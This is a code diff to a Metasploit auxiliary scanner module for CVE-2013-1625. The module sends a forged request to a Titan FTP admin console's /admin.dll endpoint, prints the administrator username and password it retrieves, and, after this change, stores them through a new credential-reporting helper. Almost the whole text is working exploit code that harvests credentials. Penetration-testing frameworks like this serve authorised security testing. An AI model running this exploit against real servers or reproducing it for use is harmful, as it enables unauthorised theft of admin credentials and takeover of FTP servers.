@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'rexml/document'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -33,25 +31,24 @@ class Metasploit3 < Msf::Auxiliary
       'License'     => MSF_LICENSE,
       'References'  =>
         [
-          [ 'CVE', '2013-1625' ],
+          [ 'CVE', '2013-1625' ]
         ]
     )
 
-    register_options([Opt::RPORT(31001)], self.class)
-    deregister_options('PASSWORD', 'USERNAME')
+    register_options([Opt::RPORT(31001)])
   end
 
   def run_host(ip)
     res = send_request_cgi(
       {
-        'uri'       => "/admin.dll",
+        'uri'       => '/admin.dll',
         'method'    => 'POST',
         'headers'   => {
           'SRT-WantXMLResponses' => 'true',
           'SRT-XMLRequest'       => 'true',
           'Authorization'        => 'Basic FAKEFAKE'
         },
-        'data'      => "<SRRequest><SRTarget>DOM</SRTarget><SRAction>GCFG</SRAction><SRServerName/><SRPayload></SRPayload></SRRequest>",
+        'data'      => '<SRRequest><SRTarget>DOM</SRTarget><SRAction>GCFG</SRAction><SRServerName/><SRPayload></SRPayload></SRRequest>'
       })
     return if not res
 
@@ -89,15 +86,38 @@ class Metasploit3 < Msf::Auxiliary
         print_good("#{ip}:#{datastore['RPORT']} - Base Directory: #{info[:basedir]}")
       end
       print_good("#{ip}:#{datastore['RPORT']} - Admin Credentials: '#{info[:username]}:#{info[:password]}'")
-      report_auth_info(
-        :host       => ip,
-        :port       => datastore['RPORT'],
-        :user       => info[:username],
-        :pass       => info[:password],
-        :ptype      => "password",
-        :proto      => "http",
-        :sname      => "Titan FTP Admin Console"
+      report_cred(
+        ip: ip,
+        port: datastore['RPORT'],
+        user: info[:username],
+        password: info[:password],
+        service_name: 'ftp'
       )
     end
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 end
